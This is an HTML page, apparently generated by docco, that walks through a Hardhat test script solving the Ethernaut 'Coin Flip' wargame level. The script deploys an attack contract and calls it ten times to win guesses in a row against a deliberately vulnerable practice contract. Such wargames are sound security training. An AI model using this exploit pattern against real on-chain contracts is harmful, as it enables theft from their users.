@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>Ethernaut 3: Coin Flip</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>Ethernaut 3: Coin Flip</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">Contract</span>, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0x4dF32584890A0026e56f7535d0f2C6486753624f&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x61fE059fcFAf734AC5b7ea5AEBAEcDC1c6A8973b&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;03_Coin Flip&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">attack</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;CoinFlip&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> factory = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&#x27;CoinFlipAttack&#x27;</span>)
+    attack = <span class="hljs-keyword">await</span> factory.<span class="hljs-title function_">deploy</span>(instance.<span class="hljs-property">address</span>)
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;guesses right using attack contract 10 times&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">const</span> <span class="hljs-title function_">progressMsg</span> = (<span class="hljs-params">i: <span class="hljs-built_in">number</span>, check?: <span class="hljs-built_in">boolean</span></span>) =&gt; {
+      process.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">write</span>(
+        <span class="hljs-string">`Guess <span class="hljs-subst">${<span class="hljs-built_in">String</span>(i + <span class="hljs-number">1</span>).padStart(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;0&#x27;</span>)}</span><span class="hljs-subst">${check ? <span class="hljs-string">&#x27;✔\n&#x27;</span> : <span class="hljs-string">&#x27;◉&#x27;</span>}</span> \r`</span>
+      )
+    }</pre></div>
+      
+        
+        <p>Ten consecutive wins are needed to pass this level. We wait for the transaction
+to be included in the chain for one block each time to ensure <code>flip</code> doesn’t
+revert due to calling it more than one time on the same block.</p>
+
+        <div class='highlight'><pre>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
+      <span class="hljs-title function_">progressMsg</span>(i)
+      <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> attack.<span class="hljs-title function_">doFlip</span>({<span class="hljs-attr">gasLimit</span>: <span class="hljs-number">100000</span>})
+      <span class="hljs-keyword">const</span> rcpt = <span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>()
+      <span class="hljs-title function_">expect</span>(rcpt.<span class="hljs-property">events</span>.<span class="hljs-property">length</span>).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">1</span>)
+      <span class="hljs-title function_">progressMsg</span>(i, <span class="hljs-literal">true</span>)
+    }
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies consecutiveWins &gt;= 10&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">consecutiveWins</span>()).<span class="hljs-property">to</span>.<span class="hljs-property">be</span>.<span class="hljs-title function_">gte</span>(<span class="hljs-number">10</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
